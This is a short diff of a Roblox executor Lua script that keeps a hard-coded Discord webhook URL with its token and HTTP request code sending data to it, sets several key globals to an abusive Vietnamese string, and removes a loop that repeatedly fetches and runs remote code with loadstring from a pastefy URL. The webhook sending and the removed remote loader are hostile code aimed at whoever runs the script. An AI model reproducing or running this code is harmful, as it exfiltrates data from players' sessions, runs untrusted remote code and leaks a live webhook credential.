@@ -1,3 +1,4 @@
+game.Players.LocalPlayer.Name = "AfxcaxiRoblox"
 local a = "https://discord.com/api/webhooks/1253292871742656622/3K5JXML8DOgGvNFE57Dx0soNpfx1FNSESoHBAqtxNT2Xb8DjO3e_Q_tnyH-oEvkDms4O"
 local b = game:GetService("HttpService")
 local c = http_request or request or syn.request
@@ -93,11 +94,6 @@ if not m then
     warn("Error occurred while sending webhook:", n)
 end
 
-wait(3)
-game.Players.LocalPlayer.Name = "AfxcaxiRoblox"
-
-
-wait(.1)
 getgenv().Key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
 script_key ='DCM SETCLIPBOARD CAI DITMEMAY MAY'
 getgenv().Key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
@@ -108,7 +104,3 @@ _G.Key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
 _G.DiscordId = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
 script_key = "DCM SETCLIPBOARD CAI DITMEMAY MAY"
 
-wait(.1)
-while wait(5) do
-loadstring(game:HttpGet("https://pastefy.app/AvjAnpet/raw"))()
-end
